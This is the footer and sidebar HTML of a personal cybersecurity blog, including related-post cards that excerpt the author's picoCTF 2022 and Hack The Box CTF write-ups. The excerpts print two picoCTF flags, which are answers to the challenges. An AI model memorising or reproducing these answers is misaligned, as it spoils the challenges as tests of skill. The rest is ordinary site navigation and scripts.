pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/sensitive-data-redaction-pyredactkit/">Sensitive data redaction/unredaction tool - PyRedactKit 🧰🔐📝</a><li><a href="/posts/regex-performance-in-golang-and-rust-which-is-faster/">Regex performance in golang and rust. Which is faster? 🤔</a><li><a href="/posts/cyber-security-education/">Cyber Security Education 🔐 🕵️ 🎓</a><li><a href="/posts/cyber-league-ctf-2022-writeups/">Cyber League CTF 2022 - Writeups 🚩</a><li><a href="/posts/grepping-for-gold-in-JSON-APIs-with-jq/">Grepping for gold in JSON APIs with jq 🔍 📄</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/projects/">Projects</a> <a class="post-tag" href="/tags/blue-team/">Blue-team</a> <a class="post-tag" href="/tags/dfir/">DFIR</a> <a class="post-tag" href="/tags/forensics/">Forensics</a> <a class="post-tag" href="/tags/picoctf-2022/">picoctf-2022</a> <a class="post-tag" href="/tags/security-toolkit/">security-toolkit</a> <a class="post-tag" href="/tags/automation/">Automation</a> <a class="post-tag" href="/tags/devops/">DevOps</a> <a class="post-tag" href="/tags/general-tech/">General-tech</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/pico-ctf-2022-web-exploitation/"><div class="card-body"> <em class="timeago small" date="2022-04-04 11:27:00 +0800" >Apr 4, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pico CTF 2022: Web-exploitation 🏁 🕸 👨🏻‍💻</h3><div class="text-muted small"><p> Local Authority Can you get the flag? Go to this website and see what you can discover. Flag : picoCTF{j5_15_7r4n5p4r3n7_6309e949} First we tried to login using random username and password to g...</p></div></div></a></div><div class="card"> <a href="/posts/looking-glass-hack-the-box-firewalker-ctf/"><div class="card-body"> <em class="timeago small" date="2022-01-14 15:03:00 +0800" >Jan 14, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Looking Glass Hack The Box Firewalker CTF 🔎 💉</h3><div class="text-muted small"><p> https://ctf.hackthebox.com/ctf/240 Point: 325 Category Web-Exploitation Question We’ve built the most secure networking tool in the market, come and check it out Solution This challenge is...</p></div></div></a></div><div class="card"> <a href="/posts/pico-ctf-2022-forensics/"><div class="card-body"> <em class="timeago small" date="2022-04-04 11:31:00 +0800" >Apr 4, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pico CTF 2022: Forensics 🕵️ 🏁</h3><div class="text-muted small"><p> Enhance Download this image file and find the flag. strings drawing.flag.svg picoCTF{3nh4nc3d_58bd3420} Flag : picoCTF{3nh4nc3d_58bd3420} Lookey here Attackers have hidden information in a ve...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/grepping-for-gold-in-JSON-APIs-with-jq/" class="btn btn-outline-primary" prompt="Older"><p>Grepping for gold in JSON APIs with jq 🔍 📄</p></a> <a href="/posts/sensitive-data-redaction-pyredactkit/" class="btn btn-outline-primary" prompt="Newer"><p>Sensitive data redaction/unredaction tool - PyRedactKit 🧰🔐📝</p></a></div><script src="https://utteranc.es/client.js" repo="brootware/brootware.github.io" issue-term="url" crossorigin="anonymous" async> </script> <script type="text/javascript"> $(function() { const origin = "https://utteranc.es"; const iframe = "iframe.utterances-frame"; const lightTheme = "github-light"; const darkTheme = "github-dark"; let initTheme = lightTheme; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } addEventListener("message", (event) => { let theme; /* credit to <https://github.com/utterance/utterances/issues/170#issuecomment-594036347> */ if (event.origin === origin) { /* page initial */ theme = initTheme; } else if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); } else { return; } const message = { type: "set-theme", theme: theme }; const utterances = document.querySelector(iframe).contentWindow; utterances.postMessage(message, origin); }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/brootware">Oaker Min (Bruce)</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/projects/">Projects</a> <a class="post-tag" href="/tags/blue-team/">Blue-team</a> <a class="post-tag" href="/tags/dfir/">DFIR</a> <a class="post-tag" href="/tags/forensics/">Forensics</a> <a class="post-tag" href="/tags/picoctf-2022/">picoctf-2022</a> <a class="post-tag" href="/tags/security-toolkit/">security-toolkit</a> <a class="post-tag" href="/tags/automation/">Automation</a> <a class="post-tag" href="/tags/devops/">DevOps</a> <a class="post-tag" href="/tags/general-tech/">General-tech</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-E65Q2J8381"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-E65Q2J8381'); }); </script>
